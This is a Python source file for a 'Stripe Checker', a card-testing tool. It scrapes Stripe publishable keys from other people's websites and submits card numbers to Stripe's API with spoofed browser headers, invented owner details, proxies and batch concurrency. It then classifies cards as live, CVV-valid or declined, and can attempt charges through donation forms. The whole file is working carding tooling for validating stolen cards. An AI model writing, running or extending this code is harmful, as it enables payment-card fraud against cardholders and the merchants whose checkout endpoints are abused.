"""
Stripe Checker - Built on BaseChecker
Example implementation showing how to extend the base checker for Stripe-based payments.
"""

import asyncio
import aiohttp
import time
import json
import re
from typing import Optional, Tuple, Dict, Any, List
from base_checker import (
    BaseChecker,
    Card,
    CheckResult,
    CardStatus,
    RandomDataGenerator,
    TextExtractor
)


class StripeChecker(BaseChecker):
    """
    Stripe payment checker extending BaseChecker.
    Can be used with any site using Stripe as payment processor.
    """
    
    # Common Stripe error codes
    ERROR_CODES = {
        'card_declined': CardStatus.DECLINED,
        'incorrect_cvc': CardStatus.CVV,
        'invalid_cvc': CardStatus.CVV,
        'incorrect_number': CardStatus.CCN,
        'invalid_number': CardStatus.CCN,
        'expired_card': CardStatus.EXPIRED,
        'invalid_expiry_month': CardStatus.EXPIRED,
        'invalid_expiry_year': CardStatus.EXPIRED,
        'insufficient_funds': CardStatus.INSUFFICIENT,
        'processing_error': CardStatus.ERROR,
        'rate_limit': CardStatus.RATE_LIMITED,
        'do_not_honor': CardStatus.DECLINED,
        'generic_decline': CardStatus.DECLINED,
        'fraudulent': CardStatus.DECLINED,
        'lost_card': CardStatus.DECLINED,
        'stolen_card': CardStatus.DECLINED,
    }
    
    def __init__(self, publishable_key: str, site_url: Optional[str] = None, **kwargs):
        """
        Initialize Stripe checker.
        
        Args:
            publishable_key: Stripe publishable key (pk_live_xxx or pk_test_xxx)
            site_url: Optional site URL for context
            **kwargs: Additional arguments passed to BaseChecker
        """
        super().__init__(**kwargs)
        self.pk = publishable_key
        self.site_url = site_url
        self.is_test = publishable_key.startswith('pk_test')
    
    def get_stripe_headers(self) -> dict:
        """Get headers for Stripe API requests"""
        return {
            'User-Agent': self.data_gen.user_agent(),
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }
    
    async def create_payment_method(self, card: Card) -> Tuple[bool, str, Optional[str]]:
        """
        Create Stripe payment method from card.
        
        Args:
            card: Card object
            
        Returns:
            Tuple of (success, message, payment_method_id)
        """
        headers = self.get_stripe_headers()
        
        data = {
            'type': 'card',
            'card[number]': card.number,
            'card[exp_month]': card.month,
            'card[exp_year]': card.year,
            'card[cvc]': card.cvv,
            'key': self.pk,
        }
        
        try:
            async with self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                data=data,
                headers=headers
            ) as resp:
                result = await resp.json()
                
                if 'id' in result:
                    return True, "Payment method created", result['id']
                
                # Handle errors
                error = result.get('error', {})
                error_code = error.get('code', 'unknown')
                error_msg = error.get('message', 'Unknown error')
                
                return False, f"{error_code}: {error_msg}", None
                
        except Exception as e:
            return False, str(e), None
    
    async def create_token(self, card: Card) -> Tuple[bool, str, Optional[str]]:
        """
        Create Stripe card token (legacy method).
        
        Args:
            card: Card object
            
        Returns:
            Tuple of (success, message, token_id)
        """
        headers = self.get_stripe_headers()
        
        data = {
            'card[number]': card.number,
            'card[exp_month]': card.month,
            'card[exp_year]': card.year,
            'card[cvc]': card.cvv,
            'key': self.pk,
        }
        
        try:
            async with self.session.post(
                'https://api.stripe.com/v1/tokens',
                data=data,
                headers=headers
            ) as resp:
                result = await resp.json()
                
                if 'id' in result:
                    return True, "Token created", result['id']
                
                error = result.get('error', {})
                error_code = error.get('code', 'unknown')
                error_msg = error.get('message', 'Unknown error')
                
                return False, f"{error_code}: {error_msg}", None
                
        except Exception as e:
            return False, str(e), None
    
    async def create_source(self, card: Card) -> Tuple[bool, str, Optional[str]]:
        """
        Create Stripe source (another legacy method).
        
        Args:
            card: Card object
            
        Returns:
            Tuple of (success, message, source_id)
        """
        headers = self.get_stripe_headers()
        
        first, last = self.data_gen.full_name()
        email = self.data_gen.email(first, last)
        
        data = {
            'type': 'card',
            'card[number]': card.number,
            'card[exp_month]': card.month,
            'card[exp_year]': card.year,
            'card[cvc]': card.cvv,
            'owner[name]': f"{first} {last}",
            'owner[email]': email,
            'key': self.pk,
        }
        
        try:
            async with self.session.post(
                'https://api.stripe.com/v1/sources',
                data=data,
                headers=headers
            ) as resp:
                result = await resp.json()
                
                if 'id' in result:
                    return True, "Source created", result['id']
                
                error = result.get('error', {})
                error_code = error.get('code', 'unknown')
                error_msg = error.get('message', 'Unknown error')
                
                return False, f"{error_code}: {error_msg}", None
                
        except Exception as e:
            return False, str(e), None
    
    def parse_stripe_error(self, error_code: str) -> CardStatus:
        """Parse Stripe error code to CardStatus"""
        return self.ERROR_CODES.get(error_code, CardStatus.UNKNOWN)
    
    async def check(self, card: Card) -> CheckResult:
        """
        Check card using Stripe payment method API.
        
        Args:
            card: Card object to check
            
        Returns:
            CheckResult with status and message
        """
        start = time.time()
        
        # Validate card
        if not card.is_valid_luhn():
            return CheckResult(
                status=CardStatus.DEAD,
                message="Invalid card number (Luhn check failed)",
                card=card,
                gateway="Stripe",
                response_time=time.time() - start
            )
        
        # Try creating payment method
        success, message, pm_id = await self.create_payment_method(card)
        elapsed = time.time() - start
        
        if success:
            # Card is valid and tokenizable
            return CheckResult(
                status=CardStatus.CCN,  # Valid but not charged
                message=f"Valid - {pm_id[:20]}...",
                card=card,
                gateway="Stripe",
                response_time=elapsed,
                extra_data={'payment_method_id': pm_id, 'mode': 'test' if self.is_test else 'live'}
            )
        
        # Parse error to determine status
        error_code = message.split(':')[0] if ':' in message else message
        status = self.parse_stripe_error(error_code)
        
        return CheckResult(
            status=status,
            message=message,
            card=card,
            gateway="Stripe",
            response_time=elapsed
        )


class StripeDonationChecker(StripeChecker):
    """
    Checker for Stripe donation/payment forms.
    Handles full payment flow including charge.
    """
    
    def __init__(self, publishable_key: str, site_url: str, **kwargs):
        super().__init__(publishable_key, site_url, **kwargs)
        self.client_secret: Optional[str] = None
        self.payment_intent_id: Optional[str] = None
    
    async def create_payment_intent(self, amount: int = 100, currency: str = 'usd') -> Tuple[bool, str]:
        """
        Create payment intent via site's backend.
        Note: This requires site-specific implementation.
        
        Args:
            amount: Amount in cents
            currency: Currency code
            
        Returns:
            Tuple of (success, client_secret or error)
        """
        # This would call the site's payment intent creation endpoint
        # Implementation is site-specific
        return False, "Requires site-specific implementation"
    
    async def confirm_payment(self, card: Card) -> Tuple[bool, str]:
        """
        Confirm payment intent with card.
        
        Args:
            card: Card object
            
        Returns:
            Tuple of (success, message)
        """
        if not self.client_secret:
            return False, "No client secret"
        
        # Create payment method first
        success, msg, pm_id = await self.create_payment_method(card)
        if not success:
            return False, msg
        
        # Confirm payment
        headers = self.get_stripe_headers()
        
        data = {
            'payment_method': pm_id,
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'key': self.pk,
            'client_secret': self.client_secret,
        }
        
        try:
            pi_id = self.payment_intent_id or self.client_secret.split('_secret')[0]
            url = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'
            
            async with self.session.post(url, data=data, headers=headers) as resp:
                result = await resp.json()
                
                status = result.get('status', '')
                
                if status == 'succeeded':
                    return True, "Payment successful"
                elif status == 'requires_action':
                    return False, "3D Secure required"
                elif 'error' in result:
                    error = result['error']
                    return False, f"{error.get('code', 'error')}: {error.get('message', 'Unknown')}"
                else:
                    return False, f"Status: {status}"
                    
        except Exception as e:
            return False, str(e)
    
    async def check(self, card: Card) -> CheckResult:
        """Full check with payment attempt"""
        start = time.time()
        
        # First do basic validation
        basic_result = await super().check(card)
        
        if basic_result.status not in [CardStatus.CCN, CardStatus.LIVE]:
            return basic_result
        
        # If card is valid, try full payment flow
        if self.client_secret:
            success, msg = await self.confirm_payment(card)
            elapsed = time.time() - start
            
            if success:
                return CheckResult(
                    status=CardStatus.LIVE,
                    message=msg,
                    card=card,
                    gateway="Stripe",
                    response_time=elapsed
                )
            else:
                status = self.parse_stripe_error(msg.split(':')[0])
                return CheckResult(
                    status=status,
                    message=msg,
                    card=card,
                    gateway="Stripe",
                    response_time=elapsed
                )
        
        return basic_result


class StripeKeyFinder:
    """Utility to find Stripe publishable keys from websites"""
    
    PK_PATTERNS = [
        r'pk_live_[a-zA-Z0-9]{24,}',
        r'pk_test_[a-zA-Z0-9]{24,}',
        r'"publishableKey"\s*:\s*"(pk_(?:live|test)_[a-zA-Z0-9]+)"',
        r"'publishableKey'\s*:\s*'(pk_(?:live|test)_[a-zA-Z0-9]+)'",
        r'data-key="(pk_(?:live|test)_[a-zA-Z0-9]+)"',
        r'Stripe\([\'"]?(pk_(?:live|test)_[a-zA-Z0-9]+)[\'"]?\)',
    ]
    
    @classmethod
    async def find_key(cls, url: str) -> Optional[str]:
        """
        Find Stripe publishable key from website.
        
        Args:
            url: Website URL
            
        Returns:
            Stripe publishable key or None
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    text = await resp.text()
                    
                    for pattern in cls.PK_PATTERNS:
                        match = re.search(pattern, text)
                        if match:
                            # Return the key (might be in group 1 or full match)
                            try:
                                return match.group(1)
                            except IndexError:
                                return match.group(0)
                    
                    return None
                    
        except Exception:
            return None
    
    @classmethod
    async def find_keys_multiple(cls, urls: List[str]) -> Dict[str, Optional[str]]:
        """Find keys from multiple URLs"""
        tasks = {url: cls.find_key(url) for url in urls}
        results = {}
        
        for url, task in tasks.items():
            results[url] = await task
        
        return results


# ==================== UTILITY FUNCTIONS ====================

async def check_with_stripe(card_str: str, pk: str, proxy: Optional[str] = None) -> CheckResult:
    """
    Quick function to check a card with Stripe.
    
    Args:
        card_str: Card string (CC|MM|YY|CVV)
        pk: Stripe publishable key
        proxy: Optional proxy string
        
    Returns:
        CheckResult
    """
    async with StripeChecker(pk, proxy=proxy) as checker:
        return await checker.check_str(card_str)


async def batch_check_stripe(
    cards: List[str], 
    pk: str, 
    concurrency: int = 5,
    proxy: Optional[str] = None
) -> List[CheckResult]:
    """
    Check multiple cards with Stripe.
    
    Args:
        cards: List of card strings
        pk: Stripe publishable key
        concurrency: Max concurrent checks
        proxy: Optional proxy string
        
    Returns:
        List of CheckResults
    """
    async with StripeChecker(pk, proxy=proxy) as checker:
        return await checker.check_batch(cards, concurrency)


# ==================== MAIN ====================

async def main():
    """Example usage"""
    print("Stripe Checker - Built on BaseChecker")
    print("=" * 50)
    
    # Example: Find Stripe key from website
    print("\n[1] Finding Stripe Keys")
    print("    Use StripeKeyFinder.find_key(url) to extract pk from any website")
    
    # Example: Basic card check
    print("\n[2] Basic Card Check")
    print("    async with StripeChecker('pk_live_xxx') as checker:")
    print("        result = await checker.check_str('4111111111111111|12|25|123')")
    
    # Example: Batch check
    print("\n[3] Batch Check")
    print("    results = await batch_check_stripe(cards_list, 'pk_live_xxx', concurrency=10)")
    
    # Example result parsing
    print("\n[4] Result Handling")
    from base_checker import Card
    
    test_card = Card.from_string("4242424242424242|12|2025|123")
    print(f"    Card BIN: {test_card.bin}")
    print(f"    Card Brand: {test_card.brand}")
    print(f"    Luhn Valid: {test_card.is_valid_luhn()}")


if __name__ == "__main__":
    asyncio.run(main())
